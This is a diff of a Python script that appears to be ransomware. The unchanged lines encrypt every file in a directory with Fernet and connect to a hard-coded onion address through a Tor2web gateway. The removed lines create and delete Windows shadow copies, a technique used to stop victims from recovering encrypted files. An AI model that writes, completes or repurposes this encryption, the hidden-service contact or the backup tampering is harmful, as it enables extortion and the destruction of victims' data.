@@ -1,19 +1,9 @@
-import vss
 import requests
 import subprocess
 import sys
 import os
 import time
 from cryptography.fernet import Fernet
-
-# Function to create a shadow copy
-def create_shadow_copy(local_drives):
-    return vss.ShadowCopy(local_drives)
-
-# Function to delete a shadow copy for a specific directory
-def delete_shadow_copy(sc, specific_directory):
-    # Delete shadow copies only for the specified directory
-    sc.delete_specific(specific_directory)
 
 # Function to connect to Tor2web
 def connect_to_tor2web(url):
@@ -69,28 +59,6 @@ def encrypt_directory(directory_to_encrypt):
                 print("Skipping file")
 
     print("Encryption completed for all files in the directory.")
-
-# Create a set that contains the LOCAL disks you want to shadow
-local_drives = set()
-local_drives.add('C')
-
-# Initialize the Shadow Copies
-sc = create_shadow_copy(local_drives)
-
-# An open and locked file we want to read
-locked_file = r'C:\foo\bar.txt'
-shadow_path = sc.shadow_path(locked_file)
-
-# shadow_path will look similar to:
-# u'\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy7\\foo\\bar.txt'
-
-# Open shadow_path just like a regular file
-with open(shadow_path, 'rb') as fp:
-    data = fp.read()
-
-# When done with file operations, clean up the shadow copies for a specific directory
-specific_directory = r'C:\foo'
-delete_shadow_copy(sc, specific_directory)
 
 # Connect to Tor2web
 connect_to_tor2web("https://duskgytldkxiuqc6.onion.to/")
